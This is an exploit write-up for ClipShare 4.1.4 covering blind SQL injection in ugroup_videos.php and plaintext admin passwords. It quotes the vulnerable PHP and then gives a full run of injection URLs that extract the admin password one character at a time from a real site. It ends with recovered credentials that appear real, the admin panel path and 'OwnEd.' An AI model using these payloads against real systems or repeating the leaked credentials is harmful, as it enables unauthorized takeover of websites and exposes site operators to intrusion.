Vulnerable Software: ClipShare - Video Sharing Community Script 4.1.4
Official site: http://www.clip-share.com
Software License: Commercial.
Vulns: Blind SQl injection && Plaintext Password.
======================================================================
AFAIK all versions is vulnerable:
Official Demo is also vulnerable: http://www.clipsharedemo.com/ugroup_videos.php?urlkey=%27%20and%203=%273
Last Checked: 13 March 2013

NOTE:To exploit this vulnerability MAGIC_QUOTES_GPC directive must be turned off on server side.(php.ini)
Vulnerable Script:
//ugroup_videos.php
=========================== BEGIN OF ugroup_videos.php =============================================
<?php
/**************************************************************************************************
| Software Name        : ClipShare - Video Sharing Community Script
| Software Author      : Clip-Share.Com / ScriptXperts.Com
| Website              : http://www.clip-share.com
| E-mail               : office@clip-share.com
|**************************************************************************************************
| This source file is subject to the ClipShare End-User License Agreement, available online at:
| http://www.clip-share.com/video-sharing-script-eula.html
| By using this software, you acknowledge having read this Agreement and agree to be bound thereby.
|**************************************************************************************************
| Copyright (c) 2006-2007 Clip-Share.com. All rights reserved.
|**************************************************************************************************/

require(&#039;include/config.php&#039;);
require(&#039;include/function.php&#039;);

$urlkey  = ( isset($_REQUEST[&#039;urlkey&#039;]) ) ? $_REQUEST[&#039;urlkey&#039;] : NULL;
$uid  = ( isset($_REQUEST[&#039;UID&#039;]) && is_numeric($_REQUEST[&#039;UID&#039;]) ) ? $_REQUEST[&#039;UID&#039;] : NULL;

$sql="SELECT * from group_own WHERE gurl=&#039;" .$urlkey. "&#039; limit 1";
$rs = $conn->Execute($sql);
if($rs->recordcount()>0) {
  STemplate::assign(&#039;groupname&#039;,$rs->fields[gname]);
  //PAGING STARTS
  $page     = ( isset($_REQUEST[&#039;page&#039;]) && is_numeric($_REQUEST[&#039;page&#039;]) ) ? $_REQUEST[&#039;page&#039;] : NULL;
  $sql     = "SELECT count(*) as total from group_mem WHERE GID=&#039;" .$rs->fields[&#039;GID&#039;]. "&#039; limit 1";
  $ars     = $conn->Execute($sql);
  $total    = ( $ars->fields[&#039;total&#039;]<=$config[&#039;total_per_ini&#039;] ) ? $ars->fields[&#039;total&#039;] : $config[&#039;total_per_ini&#039;];
  $tpage     = ceil($total/$config[&#039;items_per_page&#039;]);
  $spage    = ( $tpage == 0 ) ? $tpage+1 : $tpage;
  $startfrom   = ($page-1)*$config[&#039;items_per_page&#039;];
  $sql    = "SELECT m.*,s.addtime from group_mem as m,signup as s WHERE m.MID=s.UID and m.GID=&#039;".$rs->fields[&#039;GID&#039;]."&#039; limit $startfrom, " .$config[&#039;items_per_page&#039;];
  $rs    = $conn->execute($sql);
  if($rs->recordcount()>0)
    $vdo = $rs->getrows();
  $start_num  = $startfrom+1;
  $end_num  = $startfrom+$rs->recordcount();
  $page_link  = &#039;&#039;;
  $type    = ( isset($_REQUEST[&#039;type&#039;]) && $_REQUEST[&#039;type&#039;] != &#039;&#039; ) ? "&type=" .$_REQUEST[&#039;type&#039;] : NULL;
  for ( $k=1;$k<=$tpage;$k++ )
    $page_link.="<a href=&#039;group_members.php?UID=" .$uid. "&page=" .$k. $type. "&#039;>$k</a>&nbps;&nbps;";
  //END PAGING
}

STemplate::assign(&#039;err&#039;,$err);
STemplate::assign(&#039;msg&#039;,$msg);
STemplate::assign(&#039;page&#039;,$page);
STemplate::assign(&#039;start_num&#039;,$start_num);
STemplate::assign(&#039;end_num&#039;,$end_num);
STemplate::assign(&#039;page_link&#039;,$page_link);
STemplate::assign(&#039;total&#039;,$total);
STemplate::assign(&#039;answers&#039;,$vdo);
STemplate::assign(&#039;head_bottom&#039;,"grouplinks.tpl");
STemplate::display(&#039;head1.tpl&#039;);
STemplate::display(&#039;err_msg.tpl&#039;);
STemplate::display(&#039;ugroup_members.tpl&#039;);
STemplate::display(&#039;footer.tpl&#039;);
STemplate::gzip_encode();
?>


====================END OF ugroup_videos.php========================
Real exploitation example:

_REMOVED_/ugroup_videos.php?urlkey=1&#039; order by 14-- 3=&#039;3


http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(5=5,0,3))-- 3=&#039;3


//ON TRUE
//RETURNS: NORMAL PAGE
http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(5=5,0,3))-- 3=&#039;3

//ON FALSE
// RETURNS NOTHING.(White Page)
http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(5=2,0,3))-- 3=&#039;3




Plaintext password:
//siteadmin/login.php
============ BEGIN OF siteadmin/login.php ===========================
<?php
include(&#039;../include/config.php&#039;);

if ( isset($_POST[&#039;submit_login&#039;]) ) {
    $username   = trim($_POST[&#039;username&#039;]);
    $password   = trim($_POST[&#039;password&#039;]);

    if ( $username == &#039;&#039; or $password == &#039;&#039; ) {
        $err = &#039;Please provide a username and password!&#039;;
    } else {
        $access = false;
        $sql    = "SELECT soption FROM sconfig WHERE soption = &#039;admin_name&#039; AND svalue = &#039;" .mysql_real_escape_string($username). "&#039;";
        $conn->execute($sql);
        if ( $conn->Affected_Rows() == 1 ) {
            $sql = "SELECT soption FROM sconfig WHERE soption = &#039;admin_pass&#039; AND svalue = &#039;" .mysql_real_escape_string($password). "&#039;";
            $conn->execute($sql);
            if ( $conn->Affected_Rows() == 1 ) {
                $access = true;
            }
        }
    // SNIP //
============ END OF siteadmin/login.php ===========================



//TRUE
http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(count(`svalue`)!=0,0,3) from sconfig)-- 3=&#039;3


80 user: http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(count(`svalue`)=80,0,3) from sconfig)-- 3=&#039;3




http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(count(0)=1,0,3) from sconfig where soption=&#039;admin_name&#039;)-- 3=&#039;3


Passi cekirik:



http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(length(svalue)=&#039;11&#039;,0,3) from sconfig where soption=&#039;admin_pass&#039; limit 1 offset 0)-- 3=&#039;3

11 simvolludur pass.


========================================================

1-ci simvol:  o

http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(mid(svalue,1,1)=&#039;o&#039;,0,3) from sconfig where soption=&#039;admin_pass&#039; limit 1 offset 0)-- 3=&#039;3


========================================================
2-ci simvol:  (

http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(mid(svalue,2,1)=&#039;(&#039;,0,3) from sconfig where soption=&#039;admin_pass&#039; limit 1 offset 0)-- 3=&#039;3

========================================================
3-cu simvol:   2


http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(mid(svalue,3,1)=&#039;2&#039;,0,3) from sconfig where soption=&#039;admin_pass&#039; limit 1 offset 0)-- 3=&#039;3

========================================================

4-cu simvol:       n

http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(mid(svalue,4,1)=&#039;n&#039;,0,3) from sconfig where soption=&#039;admin_pass&#039; limit 1 offset 0)-- 3=&#039;3

========================================================

5-ci simvol:         @

http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(mid(svalue,5,1)=&#039;@&#039;,0,3) from sconfig where soption=&#039;admin_pass&#039; limit 1 offset 0)-- 3=&#039;3


========================================================

6-ci simvol:           b
http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(mid(svalue,6,1)=&#039;b&#039;,0,3) from sconfig where soption=&#039;admin_pass&#039; limit 1 offset 0)-- 3=&#039;3

========================================================

7-ci simvol:          % (yoxla sonra)

http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(mid(svalue,7,1)=&#039;%&#039;,0,3) from sconfig where soption=&#039;admin_pass&#039; limit 1 offset 0)-- 3=&#039;3


========================================================

8-ci simvol:          h

http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(mid(svalue,8,1)=&#039;h&#039;,0,3) from sconfig where soption=&#039;admin_pass&#039; limit 1 offset 0)-- 3=&#039;3

========================================================

9-cu simvol:         a

http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(mid(svalue,9,1)=&#039;a&#039;,0,3) from sconfig where soption=&#039;admin_pass&#039; limit 1 offset 0)-- 3=&#039;3


========================================================

10-cu simvol:         5

http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(mid(svalue,10,1)=&#039;5&#039;,0,3) from sconfig where soption=&#039;admin_pass&#039; limit 1 offset 0)-- 3=&#039;3

========================================================
11-ci simvol:   1

http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(mid(svalue,11,1)=&#039;1&#039;,0,3) from sconfig where soption=&#039;admin_pass&#039; limit 1 offset 0)-- 3=&#039;3

========================================================

http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(mid(svalue,1,15)=&#039;o(2n@b%ha51&#039;,0,3) from sconfig where soption=&#039;admin_pass&#039; limit 1 offset 0)-- 3=&#039;3






http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(mid(svalue,1,15)=0x6F28326E40622568613531,0,3) from sconfig where soption=&#039;admin_pass&#039; limit 1 offset 0)-- 3=&#039;3

pass: o(2n@b%ha51


http://_REMOVED_/ugroup_videos.php?urlkey=1&#039; or (select if(svalue=&#039;admin&#039;,0,3) from sconfig where soption=&#039;admin_name&#039; limit 1 offset 0)-- 3=&#039;3

login: admin
pass: o(2n@b%ha51


http://_REMOVED_/siteadmin/

OwnEd.
Tested version:
Tuesday, March 12, 2013 | Version: 4.1.4 | Username: admin | Logout
Copyright © 2006-2008 ClipShare. All rights reserved.

